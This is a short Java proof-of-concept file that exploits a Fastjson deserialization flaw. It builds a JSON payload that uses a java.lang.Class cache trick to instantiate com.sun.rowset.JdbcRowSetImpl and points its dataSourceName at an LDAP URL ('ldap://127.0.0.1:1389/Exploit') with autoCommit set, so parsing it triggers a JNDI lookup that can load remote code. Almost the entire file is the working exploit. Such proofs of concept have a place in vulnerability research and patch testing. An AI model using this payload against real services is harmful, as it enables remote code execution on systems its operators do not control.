package com.lujunyu.fastjson;

import com.alibaba.fastjson.JSON;

public class PoC {

  public static void main(String[] argv) {
    String payload =
        "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
            + "\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
            + "\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}}";
    JSON.parse(payload);
  }
}
